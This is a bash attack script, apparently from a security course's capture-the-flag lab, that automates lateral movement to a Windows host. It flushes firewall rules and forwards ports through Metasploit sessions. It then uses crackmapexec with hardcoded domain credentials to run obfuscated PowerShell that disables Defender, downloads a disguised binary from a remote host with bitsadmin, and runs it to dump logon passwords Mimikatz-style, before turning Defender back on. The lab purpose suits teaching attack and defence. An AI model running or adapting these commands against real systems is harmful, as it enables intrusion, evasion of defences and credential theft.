#!/bin/bash
# SEC599 - DtF Script - Step 4 - Move laterally to Windows01

echo "Clearing firewall rules (allow all inbound)"
echo "-------------------------------------------"
iptables -F && echo "OK - iptables flushed"
iptables -I INPUT -j ACCEPT && echo "OK - all inbound allowed"
echo "Done"

while read c; do
  ip=$(grep "^$c" /root/Desktop/CTF/output/3-metsessions_cms_backdoor_ip-final | awk -F ' ' '{print $2}')
  echo ""
  echo "Setting up portforward to Session $c - IP address $ip"
  echo "-----------------------------------------------------"
  cp /root/Desktop/CTF/4-portforwardtemplate /root/Desktop/CTF/4-portforward.rc
  sed -i "s/TEMPLATE/$c/g" /root/Desktop/CTF/4-portforward.rc
  echo "resource /root/Desktop/CTF/4-portforward.rc" | nc 127.0.0.1 55554

  echo "Use Dwight Schrute's credentials against Windows01 - Session $c - IP address $ip"
  echo "--------------------------------------------------------------------------------"

  # Disable Defender
  /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u dwight.schrute -p BattleSt4r -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA='

  # sleep 5
  /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u dwight.schrute -p BattleSt4r -x 'bitsadmin /transfer debjob /download /priority normal http://192.168.1.212:8080/svchost.exe C:\\Users\\dwight.schrute\\Downloads\\svhost.exe'
  /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u dwight.schrute -p BattleSt4r -x 'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAZAB3AGkAZwBoAHQALgBzAGMAaAByAHUAdABlAFwAXABEAG8AdwBuAGwAbwBhAGQAcwBcAFwAcwB2AGgAbwBzAHQALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='

  # Enable Defender
  /usr/bin/crackmapexec 127.0.0.1 -d SYNCTECHLABS -u dwight.schrute -p BattleSt4r -x 'powershell.exe -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAZgBhAGwAcwBlAA=='

  echo "Done"

  echo "Removing portforward to Session $c - IP address $ip"
  echo "---------------------------------------------------"
  cp /root/Desktop/CTF/4-stopportforwardtemplate /root/Desktop/CTF/4-stopportforward.rc
  sed -i "s/TEMPLATE/$c/g" /root/Desktop/CTF/4-stopportforward.rc
  echo "resource /root/Desktop/CTF/4-stopportforward.rc" | nc 127.0.0.1 55554

done </root/Desktop/CTF/output/3-cms_backdoor_sessions_final
